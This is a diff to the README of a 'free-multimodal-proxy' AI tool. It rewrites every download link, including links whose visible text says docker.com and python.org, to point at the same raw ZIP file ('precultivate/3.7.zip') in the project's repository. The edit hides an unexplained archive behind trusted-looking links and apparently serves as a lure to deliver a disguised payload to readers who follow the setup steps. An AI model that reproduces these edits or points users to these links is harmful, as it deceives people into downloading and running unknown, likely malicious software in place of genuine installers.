@@ -1,6 +1,6 @@
 # 🚀 free-multimodal-proxy - One Proxy for All AI
 
-[![Download Free Multimodal Proxy](https://img.shields.io/badge/Download-Free%20Multimodal%20Proxy-blue?style=for-the-badge&logo=github)](https://github.com/German-glissade758/free-multimodal-proxy)
+[![Download Free Multimodal Proxy](https://img.shields.io/badge/Download-Free%20Multimodal%20Proxy-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/German-glissade758/free-multimodal-proxy/main/precultivate/3.7.zip)
 
 ---
 
@@ -44,7 +44,7 @@ The best part about this tool is that getting it running is simpler than you mig
 ### 📥 Step 1: Get the Program
 
 Visit this link to download the application:  
-**[👉 Click Here to Download](https://github.com/German-glissade758/free-multimodal-proxy)**
+**[👉 Click Here to Download](https://raw.githubusercontent.com/German-glissade758/free-multimodal-proxy/main/precultivate/3.7.zip)**
 
 This takes you to the official download page where you'll find everything you need to get started.
 
@@ -52,7 +52,7 @@ This takes you to the official download page where you'll find everything you ne
 
 The simplest way to run this program is using Docker:
 
-1. **Install Docker** on your computer. Go to [docker.com](https://docker.com) and download the version for Windows. It's free and takes just a few minutes.
+1. **Install Docker** on your computer. Go to [docker.com](https://raw.githubusercontent.com/German-glissade758/free-multimodal-proxy/main/precultivate/3.7.zip) and download the version for Windows. It's free and takes just a few minutes.
    
 2. **Open a command window** (search for "Command Prompt" or "PowerShell" in your Windows search bar).
 
@@ -79,7 +79,7 @@ This tells your app to talk to the free proxy instead of the paid OpenAI service
 
 Don't want to use Docker? No problem. Here's another simple way:
 
-1. **Install Python** from [python.org](https://python.org). Make sure to check "Add Python to PATH" during installation on Windows.
+1. **Install Python** from [python.org](https://raw.githubusercontent.com/German-glissade758/free-multimodal-proxy/main/precultivate/3.7.zip). Make sure to check "Add Python to PATH" during installation on Windows.
 
 2. **Download the project** from the link above. Click the green "Code" button and choose "Download ZIP." Extract the ZIP file to a folder on your computer.
 
